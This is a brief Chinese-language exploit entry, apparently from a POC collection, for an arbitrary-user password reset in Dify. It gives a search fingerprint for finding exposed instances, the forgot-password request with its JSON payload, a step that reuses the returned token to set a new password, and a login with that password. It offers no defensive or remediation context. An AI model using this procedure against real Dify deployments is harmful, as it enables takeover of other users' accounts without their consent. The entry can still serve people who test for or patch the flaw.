# Difyforgot-password存在任意用户密码重置

Dify ｜ 其他 ｜ —
- **指纹**：`app=”Dify”`
- **请求**：`POST /console/api/forgot-password HTTP/1.1`

**Payload**
```
{"email":"test@qq.com","language":"zh-Hans"}
取第一步的data放入后续
POST /console/api/forgot-password/resets HTTP/1.1
Host:
Content-Type: application/json
{"token": "68430164-eda9-4f78-8d9d-df7cbd76e13e","new_password":"123sadxQ@D214!!!","password_confirm":"123sadxQ@D214!!!"}
使用重置后的密码登录
:---
```
- **响应特征**：200